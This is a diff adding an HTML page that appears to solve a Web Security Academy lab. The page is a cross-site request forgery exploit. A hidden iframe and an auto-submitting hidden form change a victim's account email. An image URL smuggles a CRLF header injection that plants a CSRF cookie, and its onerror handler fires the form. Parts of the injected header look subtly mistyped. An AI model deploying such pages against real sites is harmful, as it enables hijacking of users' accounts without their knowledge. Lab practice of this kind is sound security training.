@@ -1,0 +1,16 @@
+<html>
+    <body>
+        <h1>
+            Hello
+        </h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0adf00e00493b1a581a75275006100ac.web-security-academy.net/my-account/change-email" 
+        method="POST" 
+        target="csrf-iframe" 
+        id="csrf-form">
+            <input type="hidden" name="email" value="random@bing.bong">
+            <input type="hidden" name="csrf" value="PuaqPusuT81cu946ZtEP1HW3bod94Luk">
+        </form>
+        <img src="https://0a330073045b960f81b57a7e00cb0007.web-security-academy.net/?search=test%0d%0aSet-Cookir:%20csrfKey=yurk0YIQPCXS6F8gJw30Mmn1S5c4Lb4P%03$20SameSite=None" onerror="document.forms[0].submit()">
+    </body>
+</html>
